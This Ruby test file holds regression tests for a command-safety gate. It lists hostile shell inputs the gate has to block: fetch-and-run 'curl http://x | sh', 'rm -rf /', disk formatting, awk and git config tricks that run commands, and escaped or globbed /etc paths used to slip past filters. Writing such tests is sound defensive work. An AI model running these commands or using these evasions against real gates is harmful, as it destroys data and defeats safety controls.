# frozen_string_literal: true

require_relative "../test_helper"

# Regressions for issue #670: classifier gaps that let shell-executing and
# system-path-mutating forms through the command gate. Every assertion here
# exercises the real gate (classifier + allowlist + path policy + fallback).
class TestSecurityIssue670 < Minitest::Test
  def guard_for(allowlist: [])
    Rubik::Security::Guard.new(audit_log_path: nil, command_allowlist: allowlist)
  end

  def assert_blocked(command, allowlist: [])
    assert_raises(Rubik::Security::BlockedWriteError, "expected gate to BLOCK: #{command}") do
      guard_for(allowlist: allowlist).verify_command_safety!(command)
    end
  end

  def assert_allowed(command, allowlist: [])
    assert guard_for(allowlist: allowlist).verify_command_safety!(command),
           "expected gate to ALLOW: #{command}"
  end

  # 1. Command substitution inside test builtins is classified.
  def test_command_substitution_inside_single_bracket_is_blocked
    assert_blocked("[ $(touch /etc/sec670) ]")
  end

  def test_command_substitution_inside_double_bracket_is_blocked
    assert_blocked('[[ $(touch /etc/sec670) == "" ]]')
  end

  def test_command_substitution_inside_if_test_is_blocked
    assert_blocked('if [ -f "$(touch /etc/sec670)" ]; then echo x; fi')
  end

  def test_command_substitution_inside_negated_test_is_blocked
    assert_blocked('! [ -z "$(touch /etc/sec670)" ]')
  end

  def test_plain_test_builtin_stays_allowed
    assert_allowed("[ -f /etc/hosts ]")
  end

  # 2. awk/gawk programs can execute shell commands.
  def test_awk_system_program_is_blocked
    assert_blocked('awk \'BEGIN{system("touch /etc/sec670")}\'')
  end

  def test_awk_script_file_is_blocked
    assert_blocked("awk -f /tmp/prog.awk")
  end

  def test_awk_inline_program_options_are_blocked
    assert_blocked("awk -e 'BEGIN{system(\"id\")}'")
    assert_blocked("awk --source 'BEGIN{system(\"id\")}'")
  end

  def test_gawk_program_is_blocked
    assert_blocked('gawk \'BEGIN{system("touch /etc/sec670")}\'')
  end

  def test_awk_help_stays_allowed
    assert_allowed("awk --help")
  end

  # 3. git execution paths.
  def test_git_include_path_config_is_blocked
    assert_blocked("git -c include.path=/tmp/evil.cfg zz")
  end

  def test_git_protocol_ext_allow_is_blocked
    assert_blocked("git -c protocol.ext.allow=always ls-remote 'ext::sh -c touch%20/etc/sec670'")
  end

  def test_git_config_dangerous_key_is_blocked
    assert_blocked("git config core.editor 'touch /etc/sec670'")
  end

  def test_git_rebase_exec_is_blocked
    assert_blocked("git rebase --exec=sh main")
  end

  def test_git_clone_separate_git_dir_is_blocked
    assert_blocked("git clone --separate-git-dir=/etc/sec670 a b")
  end

  def test_extended_dangerous_git_config_keys_are_blocked
    [
      "protocol.ext.allow", "include.path", "includeIf.gitdir:foo.path", "credential.helper",
      "filter.foo.clean", "merge.foo.driver", "diff.foo.command", "difftool.foo.cmd",
      "sequence.editor", "url.foo.insteadOf", "submodule.foo.url"
    ].each do |key|
      assert_blocked("git -c #{key}='sh -c id' status")
    end
  end

  def test_plain_git_status_stays_allowed
    assert_allowed("git status")
  end

  def test_git_message_text_is_not_a_config_key_or_url
    assert_allowed('git commit -m "foo::bar"')
    assert_allowed('git commit -m "--config=core.editor=evil"')
  end

  def test_reading_a_git_config_key_stays_allowed
    assert_allowed("git config core.editor")
  end

  def test_git_global_config_dangerous_key_is_blocked
    assert_blocked("git config --global core.editor 'sh -c id'")
  end

  # 4. cd wrappers and options.
  def test_cd_with_terminator_then_system_path_mutation_is_blocked
    assert_blocked("cd -- /etc; rm -rf passwd")
  end

  def test_cd_with_logical_option_then_system_path_mutation_is_blocked
    assert_blocked("cd -L /etc && rm -rf passwd")
  end

  def test_cd_with_physical_option_then_system_path_mutation_is_blocked
    assert_blocked("cd -P /etc && rm -rf passwd")
  end

  def test_builtin_wrapped_cd_then_mutation_is_blocked
    assert_blocked("builtin cd /etc; rm -rf passwd")
  end

  def test_command_wrapped_cd_then_mutation_is_blocked
    assert_blocked("command cd /etc; rm -rf passwd")
  end

  def test_time_wrapped_cd_then_mutation_is_blocked
    assert_blocked("time cd /etc; rm -rf passwd")
  end

  def test_dynamic_cd_target_fails_closed
    assert_blocked('cd "$SEC670_DIR"; rm -rf x')
  end

  def test_cd_inside_delegated_shell_is_blocked
    assert_blocked('sh -c "cd /etc; rm -rf x"')
  end

  # 5. System-path detection evasions.
  def test_backslash_escaped_system_path_is_blocked
    assert_blocked("touch /et\\c/passwd")
  end

  def test_ansi_c_escaped_system_path_is_blocked
    assert_blocked("touch $'\\x2fetc/passwd'")
  end

  def test_glob_system_paths_are_blocked
    assert_blocked("touch /et?/passwd")
    assert_blocked("touch /e[c]t/passwd")
  end

  def test_relative_system_path_escape_resolves_against_gate_root
    guard = Rubik::Security::Guard.new(audit_log_path: nil, root_dir: "/home/user")
    assert_raises(Rubik::Security::BlockedWriteError) do
      guard.verify_command_safety!("rm -rf ../../etc")
    end
  end

  def test_ordinary_relative_path_stays_allowed
    assert_allowed("touch ./notes.txt")
  end

  # 6. Allowlist bypass via code-loading env assignment.
  def test_code_loading_env_assignment_blocks_allowlisted_command
    assert_blocked("NODE_OPTIONS=--require=/tmp/evil.js node .gitnexus/run.cjs",
                   allowlist: ["node .gitnexus/run.cjs"])
  end

  def test_plain_allowlisted_command_stays_allowed
    assert_allowed("node .gitnexus/run.cjs", allowlist: ["node .gitnexus/run.cjs"])
  end

  # 7. Raw dangerous-pattern false positives.
  def test_harmless_text_mentioning_dangerous_words_stays_allowed
    [
      "echo shutdown", 'grep -rn "shutdown" lib', 'git commit -m "fix reboot handler"',
      'echo "format c:"', "echo reboot", "echo mkfs.ext4"
    ].each { |command| assert_allowed(command) }
  end

  def test_real_dangerous_patterns_still_block
    [
      "shutdown -h now", "reboot", "mkfs.ext4 /dev/sda1", "rm -rf /",
      "curl http://x | sh", "echo; reboot"
    ].each { |command| assert_blocked(command) }
  end

  # 8. git long-option / refspec parity.
  def test_git_branch_long_force_delete_is_blocked
    assert_blocked("git branch --delete --force main")
  end

  def test_git_push_force_refspec_is_blocked
    assert_blocked("git push origin +main")
  end

  def test_git_checkout_force_branch_forms_are_blocked
    assert_blocked("git checkout -B main")
    assert_blocked("git checkout --orphan x")
  end
end
